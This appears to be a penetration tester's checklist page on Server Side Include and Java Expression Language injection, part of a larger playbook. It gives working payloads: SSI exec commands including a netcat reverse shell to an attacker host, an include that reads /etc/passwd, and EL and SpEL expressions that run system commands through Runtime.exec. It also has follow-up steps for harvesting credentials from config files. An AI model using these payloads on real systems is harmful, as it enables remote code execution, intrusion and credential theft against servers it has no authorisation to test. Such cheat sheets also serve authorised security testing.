# SSI and EL injection

## SSI: is it parsed
<!--#echo var="DATE_LOCAL" -->
- [ ] A date comes back: the server parses SSI, so exec next
- [ ] Where: polls, guestbooks, error pages, and .shtml, .stm and .shtm URLs

## SSI: commands
<!--#exec cmd="id" -->
<!--#exec cmd="nc <LHOST> <LPORT> -e /bin/bash" -->
<!--#include virtual="/etc/passwd" -->
- [ ] My input has to survive the filter: a <!-- that comes back whole is the sign

## EL: is it evaluated, in Java
${7*7}
#{7*7}
*{7*7}
- [ ] 49 comes back: evaluated

## EL: further
${pageContext.request.getSession().getServletContext().getServerInfo()}
${T(java.lang.Runtime).getRuntime().exec('id')}
- [ ] Spring and Thymeleaf: T(x) to reach a class, and __${...}__::.x for preprocessing
- [ ] EL is the Java part of template injection: :Pb ssti

## If it fails
- [ ] The payload comes back as text: no injection, once the HTML-entity forms are tried too
- [ ] exec blocked but echo and include work: file read only, so configs for credentials

## Next
- [ ] Commands: a shell, :Pb shells
- [ ] Credentials from configs: :Pb linux-creds once on the host
